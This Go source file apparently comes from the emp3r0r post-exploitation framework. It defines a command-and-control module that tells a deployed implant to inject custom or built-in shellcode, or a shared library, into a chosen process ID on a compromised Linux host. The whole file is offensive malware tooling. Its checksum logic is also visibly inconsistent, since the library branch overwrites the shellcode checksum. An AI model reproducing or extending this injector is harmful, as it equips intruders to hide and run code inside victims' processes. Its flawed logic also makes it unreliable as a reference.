//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func moduleInjector() {
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}
	if Options["method"] == nil || Options["pid"] == nil {
		CliPrintError("One or more required options are nil")
		return
	}
	method := Options["method"].Val

	checksum := ""
	shellcode_file := "shellcode.txt"
	so_file := "to_inject.so"

	// shellcode.txt
	pid := Options["pid"].Val
	if method == "shellcode" && !util.IsExist(WWWRoot+shellcode_file) {
		CliPrintWarning("Custom shellcode '%s%s' does not exist, will inject guardian shellcode", WWWRoot, shellcode_file)
	} else {
		checksum = tun.SHA256SumFile(WWWRoot + shellcode_file)
	}

	// to_inject.so
	if method == "shared_library" && !util.IsExist(WWWRoot+so_file) {
		CliPrintWarning("Custom library '%s%s' does not exist, will inject loader.so instead", WWWRoot, so_file)
	} else {
		checksum = tun.SHA256SumFile(WWWRoot + so_file)
	}

	// injector cmd
	cmd := fmt.Sprintf("%s --method %s --pid %s --checksum %s", emp3r0r_data.C2CmdInject, method, pid, checksum)

	// tell agent to inject
	err = SendCmd(cmd, "", target)
	if err != nil {
		CliPrintError("Could not send command (%s) to agent: %v", cmd, err)
		return
	}
	CliMsg("Please wait...")
}
